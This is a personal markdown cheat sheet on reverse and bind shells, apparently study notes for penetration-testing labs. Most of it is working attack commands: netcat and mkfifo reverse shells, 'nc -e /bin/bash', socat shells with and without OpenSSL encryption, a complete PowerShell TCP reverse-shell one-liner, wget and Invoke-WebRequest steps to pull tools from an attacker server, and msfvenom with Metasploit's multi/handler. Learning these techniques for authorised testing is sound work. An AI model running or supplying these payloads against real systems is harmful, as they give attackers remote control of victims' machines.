# Everything about Reverse and Bind Shells



Reverse shell: the attacker sends a payload to the target so that the target connects to the attacker machine which is listening on a certain port for an incoming connection.
In this case the code the target is FORCED TO EXECUTE CODE which CONNECTS BACK TO ATTACKER
which is listening.  

Bind shell: opposite of rev shell, the payload makes the target listen on a certain port 
            while the attacker connects to that port and binds to the shell hosted on the
            target machine. Here the client connects directly to the shell on the target host. 

The difference is if the packets are coming IN or OUT from the target host perspective.


 ## Tools

    1. Netcat (nc)


 ## Commands

    Reverse shell:

    1. Start listener on attacker machine: 
        
        ```
        nc -lvnp <port-number>

        ```
    2. Deploy payload on target machine so that it connects back to the 
        attacker netcat session. 

    
    Bind shell:

    1. Send the payload to the target so that it starts listening on a port
        and outputs whatever into a shell.
    2. Connect to the target machine:

        ```
        nc <target-ip> <chosen-port>        

        ```


Problem: netcat shells sucks, they terminate easily since they are just processes 
            running inside a shell, not an anctual shell itself. 

Can we stabilise a shell ? YEEES, Linux is easier, Windows harder. Look at this:

### Using python

    ```
    python/2/3 -c 'import pty;pty.spawn("/bin/bash")' //spawn a shell in python
    export TERM=xterm //export this env variable
    ```
    // then we background the shell usin CTRL-Z 
    
    //Then back at our own terminal
    ```
    stty raw -echo; fg  //turn off our own terminal echo and then foregrounds the shell
    ```    
    (to re-enable output to the terminal type 'reset')



### Using rlwrap

Very useful for Windows, where the python thing might not work.

   1. sudo apt install rlwrap
   2. rlwrap nc -lvnp <port>


## Socat

Here literally we use the first netcat session to send the shell binary to the target machine, execute it and then connect to it.
    
A typical way to do this would be to setup a webserver on the attacker's machine:

    ```
    sudo python3 -m http.server 80
    ```

Then on the target machine, using the nc shell, download the socat binary:

    ```
    wget <attacker-ip>/socat -o /tmp/socat
    ```

    This is to do this in a windows CLI env:

    ```
    Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe
    ```


Very useful:  find the rows and columns on the target machine: 'stty -a', then on the 
                attacker machine resize the terminal: ' sttyw rows <number>' and 'stty cols <               number>'


### How to use Socat

Think of Socat as a way to connect two endpoints. (its a multipurpose relay)

Basic reverse shell using socat:

```
socat TCP-L:<port> -
```

On the target windows machine we would send this as the payload to connect back:

```
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```

This is on a linux target machine:
```
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
```

Here you can find the socat commands for bind shell: tryhackme.com/r/room/introtoshells

In any case we use this on the attacker machine to bind to a shell on the target:

```
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```

### Powerful and stable Linux reverse shell using socat

    Command to setup the listener on the attacker machine:

    ```
    socat TCP-L:<port> FILE:`tty`,raw,echo=0
    ```
    We are connecting two endpoints together, one listening on <port> and a file
    we are passing our current tty as a file and setting the echo to zero. 

Now on the target machine we need to send this as payload to connect to it, after
having sent a socat binary some other way:

```
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane

```

Having done this we are goood to go. If something is weird try adding a debug mode 
to the code used on the target machine.

### Encrypted bind and reverse shell

Socat is so great that we can also create encrytped shells! Both bind and reverse!
Just replace TCP with OPENSSL on the previous commands.

First we need to setup some certificates:

```
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```
This will create a 2048bit RSA key with matching cert file, self-signed and valid for just under one year, lets merge both into a .pem file:

```
cat whatever.key whatever2.crt > whatever3.pem
```
Now, after having sent both the .pem file and the socat binary to the target machine, 
we can setup a listener:

```
socat OPENSSL-LISTEN:<<port-number>>,cert=whatever.pem,verify=0 FILE:`tty`,raw,echo=0

```
Then on the target we can connect back like this, 

```
socat OPENSSL:<attacker-ip-address>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane

```




Simple payload for reverse shell on Linux creating a pipe from netcat to the shell:

```
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

```

POWERSHELL REVERSE SHELL PAYLOAD:

```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```


BEST WEBSITE FOR REVERSE AND BIND SHELL ON DIFFERENT LANGUAGES: 
    github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
    Websites with payloads for reverse and bind shells: swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/


## How can I send file on a LAN using wget ?

First host an http server using: 
```
python -m http.server

```
This will start a http server on the current path of execution of the python command.

Now you can download anything using: wget 
```
http://<sender-ip>:<send-port>/path/to/filename
```


## Socat encrypted reverse shell

Simple method:

1. setup listener: ```socat OPENSSL-LISTEN:<port>,cert=shell.pem,verify=0 -```
2. connect back from target: ```socat OPENSSL:10.11.77.98:6969,verify=0 EXEC:/bin/bash```

Better method: (needs an openssl .pem file on the listener machine, verify=0 necessary to not check against certificate trusted authority2)
1. setup listener: ```socat OPENSSL-LISTEN:6969,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0```
2. connectback from target: ```socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane```


## Simple Netcat + Python reverse shell

Setup a simple netcat shell:

On attacker: 

1. sudo rlwrap nc -lvnp <port>

On target: 

1. nc <ip-attacker> <port> -e /bin/bash

Now from the reverse shell do this:

1. python -c 'import pty;pty.spawn("/bin/bash")'
2. export TERM=xterm
3. CTRL-Z (move shell in background)
4. stty raw -echo; fg (turn off the echo of our tty and put the python rev shell in foreground)
5. use 'reset' to fix the shell when exiting from rev shell

This is a half-way between the horrible netcat simple shell and the better socat encrypted shell


## Payload generator

msfvenom 

generates payload both staged and stageless for shell and meterpreter (metasploit shell handler)

use like:

msfvenom -p linux/x86/shell_reverse_tcp -f elf -o payload LHOST=0.0.0.0 LPORT=6969

its great!


## Reverse shell with Metasploit using multi/handler and msfvenom payload (ABSOFUCKINGLUTELY GREAT)
    
    0. Generate a suitable payload with msfvenom and put it in the target machine (maybe using nc or smth easier)
    1. use the multi/hanlder module on msfconsole (info once inside to get help or options to see the available options) with the payload used with msfvenom, set LHOST and LPORT
    2. run exploit to start the listener and run the payload on the target machine, et voila you can do everyfuckingthing!









